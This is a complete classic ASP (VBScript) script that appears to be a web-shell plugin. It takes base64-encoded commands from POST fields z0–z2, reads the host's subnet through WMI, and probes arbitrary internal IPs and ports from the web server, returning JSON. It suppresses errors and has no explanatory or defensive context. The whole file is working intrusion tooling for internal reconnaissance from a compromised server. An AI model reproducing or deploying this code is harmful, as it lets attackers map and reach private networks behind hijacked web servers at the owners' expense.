<%

On Error Resume Next
Server.ScriptTimeout = 5

Function Base64Decode(ByVal vCode)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = BinaryToString(oNode.nodeTypedValue)
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function BinaryToString(Binary)
    Dim oStream
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 1 ' adTypeBinary
    oStream.Open
    oStream.Write Binary
    oStream.Position = 0
    oStream.Type = 2 ' adTypeText
    oStream.Charset = "utf-8"
    BinaryToString = oStream.ReadText
    Set oStream = Nothing
End Function

Function GetNetworkSubnet()
    Dim objWMIService, colAdapters, objAdapter
    Dim ipAddress, subnet, i, parts
    
    subnet = "192.168.1"
    
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colAdapters = objWMIService.ExecQuery("Select IPAddress, DefaultIPGateway from Win32_NetworkAdapterConfiguration Where IPEnabled = True")
    
    For Each objAdapter In colAdapters
        If Not IsNull(objAdapter.DefaultIPGateway) Then
            For i = LBound(objAdapter.IPAddress) To UBound(objAdapter.IPAddress)
                ' 篩選出 IPv4
                If InStr(objAdapter.IPAddress(i), ".") > 0 And objAdapter.IPAddress(i) <> "0.0.0.0" Then
                    ipAddress = objAdapter.IPAddress(i)
                    Exit For
                End If
            Next
            If ipAddress <> "" Then Exit For
        End If
    Next
    
    If ipAddress <> "" Then
        parts = Split(ipAddress, ".")
        If UBound(parts) = 3 Then
            subnet = parts(0) & "." & parts(1) & "." & parts(2)
        End If
    End If
    
    GetNetworkSubnet = subnet
End Function

Function CheckPort(ip, port)
    Dim xmlHttp
    On Error Resume Next
    Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    
    xmlHttp.setTimeouts 1000, 1500, 1000, 1000
    
    xmlHttp.open "GET", "http://" & ip & ":" & port & "/", False
    xmlHttp.send
    
    If Err.Number = 0 Or Err.Number = -2147012867 Then
        CheckPort = True
    Else
        CheckPort = False
    End If
    
    Err.Clear
    Set xmlHttp = Nothing
End Function

Dim action, target_ip, target_port, subnet
action = Base64Decode(Request.Form("z0"))

Select Case action
    Case "info"
        subnet = GetNetworkSubnet()
        Response.ContentType = "application/json"
        Response.Write "{""status"":""success"",""subnet"":""" & subnet & """}"
        
    Case "check"
        target_ip = Base64Decode(Request.Form("z1"))
        target_port = Base64Decode(Request.Form("z2"))
        
        Response.ContentType = "application/json"
        If target_ip = "" Or Not IsNumeric(target_port) Then
            Response.Write "{""open"":false}"
        Else
            If CheckPort(target_ip, CInt(target_port)) Then
                Response.Write "{""open"":true,""ip"":""" & target_ip & """,""port"":" & target_port & "}"
            Else
                Response.Write "{""open"":false}"
            End If
        End If
End Select

If Err.Number <> 0 Then Err.Clear
%>